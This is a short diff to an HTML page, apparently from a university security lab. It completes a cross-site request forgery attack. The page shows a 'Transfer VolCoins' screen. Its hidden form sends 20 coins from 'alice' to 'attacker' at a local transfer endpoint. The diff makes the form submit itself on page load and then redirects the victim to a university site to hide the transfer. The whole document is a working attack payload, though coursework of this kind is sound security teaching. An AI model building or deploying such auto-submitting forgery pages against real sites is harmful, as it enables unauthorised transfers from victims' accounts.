@@ -9,19 +9,22 @@
 <body>
     <h1>Transfer VolCoins</h1>
     <p>You currently have 1100 volCoins.</p>
-    <form id="csrfForm" action="Transfer VolCoins" method="POST">
+    <form id="csrfForm" action="http://localhost:3000/transfer" method="POST">
         <input type="hidden" name="from" value="alice">
         <input type="hidden" name="to" value="attacker">
         <input type="hidden" name="amount" value="20">
-        <input type="submit" value="Transfer">
+        <button id="transferButton">Transfer</button>
     </form>
     <script>
-        document.getElementById("csrfForm").submit();
-        setTimeout(function(){
-            window.location.href = "https://eecs.utk.edu/";
-        }, 1000); // Redirect after 1 second
+        window.onload = function() {
+            document.getElementById("transferButton").click(); // Submit the form
+            setTimeout(function(){
+                window.location.href = "https://eecs.utk.edu/";
+            }, 1000); // Redirect after 1 second
+        }
     </script>
 </body>
 </html>
+
 
 
